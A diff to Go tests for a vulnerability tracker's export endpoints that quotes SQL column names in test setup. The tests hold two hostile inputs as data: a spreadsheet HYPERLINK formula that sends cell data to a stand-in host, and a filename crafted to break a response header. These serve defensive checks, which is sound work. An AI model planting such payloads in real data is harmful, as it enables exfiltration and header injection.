@@ -26,8 +26,8 @@ func TestAnExportIsTheListWithTheSameVisibility(t *testing.T) {
 		// One of the two undisclosed, so the same request answers differently
 		// for two people.
 		if _, err := r.DB.DB.NewUpdate().Table("finding").
-			Set("visibility = ?", "private").
-			Where(`vulnerability_id IN (SELECT id FROM "vulnerability" WHERE identifier = ?)`,
+			Set(`"visibility" = ?`, "private").
+			Where(`"vulnerability_id" IN (SELECT "id" FROM "vulnerability" WHERE "identifier" = ?)`,
 				"CVE-2026-1000").
 			Exec(t.Context()); err != nil {
 			t.Fatal(err)
@@ -173,7 +173,7 @@ func TestAnUnscoredFindingExportsWithNoScoreRatherThanAZero(t *testing.T) {
 	httpapitest.TwoReach(t, func(t *testing.T, r *httpapitest.Reach) {
 		r.ScannedTwoIssues(t)
 		if _, err := r.DB.DB.NewUpdate().Table("vulnerability").
-			Set("score_centi = NULL").Where("1 = 1").Exec(t.Context()); err != nil {
+			Set(`"score_centi" = NULL`).Where("1 = 1").Exec(t.Context()); err != nil {
 			t.Fatal(err)
 		}
 		got := httpapitest.AsPerson(t, r, "triager", http.MethodGet,
@@ -216,8 +216,8 @@ func TestTheOtherThreeListsExportWithTheSameVisibility(t *testing.T) {
 	httpapitest.TwoReach(t, func(t *testing.T, r *httpapitest.Reach) {
 		r.ScannedTwoIssues(t)
 		if _, err := r.DB.DB.NewUpdate().Table("finding").
-			Set("visibility = ?", "private").
-			Where(`vulnerability_id IN (SELECT id FROM "vulnerability" WHERE identifier = ?)`,
+			Set(`"visibility" = ?`, "private").
+			Where(`"vulnerability_id" IN (SELECT "id" FROM "vulnerability" WHERE "identifier" = ?)`,
 				"CVE-2026-1000").
 			Exec(t.Context()); err != nil {
 			t.Fatal(err)
@@ -427,8 +427,8 @@ func TestAnExportedNameCannotBeAFormula(t *testing.T) {
 
 		hostile := `=HYPERLINK("http://example.test/"&A1,"detail")`
 		if _, err := r.DB.DB.NewUpdate().Table("component").
-			Set("name = ?", hostile).
-			Where(`name = ?`, "linux-image").
+			Set(`"name" = ?`, hostile).
+			Where(`"name" = ?`, "linux-image").
 			Exec(t.Context()); err != nil {
 			t.Fatal(err)
 		}
@@ -481,8 +481,8 @@ func TestAnExportedFilenameCannotEndTheHeader(t *testing.T) {
 		// one, which is tested where that check is.
 		hostile := `mine"; x="y`
 		if _, err := r.DB.DB.NewUpdate().Table("product").
-			Set("name = ?", hostile).
-			Where("name = ?", "mine").Exec(t.Context()); err != nil {
+			Set(`"name" = ?`, hostile).
+			Where(`"name" = ?`, "mine").Exec(t.Context()); err != nil {
 			t.Fatal(err)
 		}
 		got := httpapitest.AsPerson(t, r, "triager", http.MethodGet,
@@ -515,8 +515,8 @@ func TestTheCrossProductExportCarriesTheProductAndTheVisibility(t *testing.T) {
 	httpapitest.TwoReach(t, func(t *testing.T, r *httpapitest.Reach) {
 		r.ScannedTwoIssues(t)
 		if _, err := r.DB.DB.NewUpdate().Table("finding").
-			Set("visibility = ?", "private").
-			Where(`vulnerability_id IN (SELECT id FROM "vulnerability" WHERE identifier = ?)`,
+			Set(`"visibility" = ?`, "private").
+			Where(`"vulnerability_id" IN (SELECT "id" FROM "vulnerability" WHERE "identifier" = ?)`,
 				"CVE-2026-1000").
 			Exec(t.Context()); err != nil {
 			t.Fatal(err)
